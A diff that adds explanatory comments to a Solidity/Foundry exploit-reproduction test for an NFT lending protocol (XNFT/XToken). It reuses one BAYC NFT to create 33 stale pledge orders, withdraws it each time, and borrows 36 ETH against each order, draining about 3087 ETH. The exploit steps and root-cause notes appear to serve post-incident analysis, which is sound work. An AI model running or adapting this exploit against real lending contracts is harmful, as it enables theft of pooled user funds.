@@ -58,11 +58,23 @@ interface IXToken {
 }
 
 /* Contract: 0xa04ec2366641a2286782d104c448f13bf36b2304 */
+// VULNERABILITY: Dummy xToken (INothing) that implements borrow() signature but does nothing.
+// Used in pledgeAndBorrow(xToken=doNothing, borrowAmount=0) so pledgeInternal succeeds (NFT transferred in, Order created)
+// but no debt is registered (controller never sees a real borrow). Allows immediate withdrawNFT while Order record persists.
 interface INothing {
     function borrow(uint256 orderId, address payable borrower, uint256 borrowAmount) external;
 }
 
 /* Contract: 0x2d6e070af9574d07ef17ccd5748590a86690d175 */
+// VULNERABILITY ROOT CAUSE SUMMARY (for exploit reproduction):
+// - XNFT pledge* creates durable Order {pledger, collection, tokenId, ...} + takes NFT via safeTransferFrom.
+// - pledgeAndBorrow allows *any* xToken addr (no check against listed pools in controller).
+// - withdrawNFT returns NFT when debt==0 but leaves Order intact (only flips isWithdraw).
+// - P2Controller.orderAllowed / borrowAllowed only checks getOrderDetail (pledger) + !isLiquidated; ignores isWithdraw and NFT balance.
+// - XToken.borrow can be called directly (outside pledge flow) using the pledger as borrower.
+// Result: single BAYC used to "pledge" 33x, withdrawn each time, then 33 independent 36 ETH borrows.
+// Total: 3087 ETH drained from XToken liquidity pool with zero net collateral locked.
+// Preconditions: BAYC whitelisted, attacker controls NFT, can set tx.origin via prank, pool has ETH.
 contract payloadContract is Test {
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
@@ -81,11 +93,21 @@ contract payloadContract is Test {
     function makePledge() public {
         BAYC.setApprovalForAll(address(XNFT), true);
 
+        // EXPLOIT STEP 1: Create a ghost pledge record using dummy xToken + 0 borrow.
+        // Calls XNFT.pledgeAndBorrow -> pledgeInternal (transfers BAYC#5110 into XNFT, allocates fresh orderId, sets pledger=this payload)
+        // then dummy.borrow(...,0) which is a no-op. Because borrowAmount==0, no controller interaction, no debt.
+        // Reference: XNFT.pledgeAndBorrow L108, pledgeInternal L125 (custody + allOrders write), INothing.
         // Attacker was call `pledgeAndBorrow()`, But `pledge()` also vulnerable.
         XNFT.pledgeAndBorrow(address(BAYC), 5110, 721, address(doNothing), 0);
 
         orderId = XNFT.counter();
         assert(orderId >= 11); // Attacker start by orderId:11
+
+        // EXPLOIT STEP 2: Immediately withdraw the NFT (possible because current borrowBalance==0 via controller).
+        // withdrawNFT succeeds (pledger check + debt==0), returns BAYC to this payload, sets isWithdraw=true.
+        // BUT the Order entry (collection, tokenId, pledger) is NOT cleared. getOrderDetail will still return valid pledger.
+        // This is the core of the flaw: withdraw "frees" the NFT for reuse while leaving borrowable orderId behind.
+        // Reference: XNFT.withdrawNFT L257 (non-liq path), L263 (isWithdraw=true), controller.getOrderBorrowBalanceCurrent.
         XNFT.withdrawNFT(orderId);
 
         BAYC.transferFrom(address(this), msg.sender, 5110);
@@ -93,6 +115,11 @@ contract payloadContract is Test {
 
     // function 0x2a3e7cec()
     function dumpETH() public {
+        // EXPLOIT STEP 3 (per payload): Borrow against the *stale* orderId from a real XToken.
+        // XToken.borrow(orderId, this, 36e18) -> require passes (tx.origin or msg.sender), borrowInternal ->
+        // controller.borrowAllowed -> orderAllowed (getOrderDetail returns our pledger, !liquidated) -> price/max checks pass for new orderDebtStates.
+        // 36 ETH is transferred out even though BAYC#5110 is NOT inside XNFT (was withdrawn in step 2).
+        // Reference: XToken L186, borrowInternal L200, P2Controller.borrowAllowed L60 / orderAllowed L49 (no isWithdraw check).
         XToken.borrow(orderId, payable(address(this)), 36 ether);
         payable(msg.sender).transfer(address(this).balance);
     }
@@ -128,6 +155,8 @@ contract mainAttackContract is Test {
         cheat.startPrank(attacker);
         BAYC.transferFrom(attacker, address(this), 5110);
         cheat.stopPrank();
+        // EXPLOIT SETUP: The single BAYC NFT is the only "capital" required. All 33 "pledges" reuse it via withdraw+transfer handoff.
+        // Real attack also deployed the INothing dummy at 0xA04EC... before the pledge txs.
     }
 
     // [Main Attack Contract].0xadf6a75d()
@@ -138,6 +167,11 @@ contract mainAttackContract is Test {
 
         emit log_string("[Exploit] Making pledged record...");
         for (uint8 i = 0; i < payloads.length; ++i) {
+            // EXPLOIT STEP (outer loop): Deploy fresh payload + hand-off the BAYC NFT.
+            // Each payloadContract will become the 'pledger' for its own orderId (required by orderAllowed: _pledger == borrower).
+            // NFT is transferred payload -> (inside makePledge: to XNFT -> back to payload -> back to main), enabling reuse of the *same* tokenId 5110 for 33 distinct orders.
+            // Why 33? To multiply the per-order max borrow (collateralFactor * price allows ~36 ETH each) without locking the NFT.
+            // See payload.makePledge for per-order steps.
             payloadContract payload = new payloadContract();
             cheat.deal(address(payload), 0); // Set balance 0 ETH to avoid conflict on forknet
             payloads[i] = payable(address(payload));
@@ -153,6 +187,10 @@ contract mainAttackContract is Test {
 
         emit log_string("[Exploit] Dumping ETH from borrow...");
         for (uint8 i = 0; i < payloads.length; ++i) {
+            // EXPLOIT STEP (drain): Trigger borrow on each stale order from its pledger payload.
+            // Uses low-level call so each dumpETH executes in payload context (msg.sender inside will satisfy XToken's borrower check via tx.origin=attacker).
+            // Each succeeds independently because each orderId has its own entry with no prior debt recorded on it.
+            // Funds land in payload then forwarded to mainAttackContract.
             payloads[i].call(abi.encodeWithSignature("dumpETH()"));
         }
 
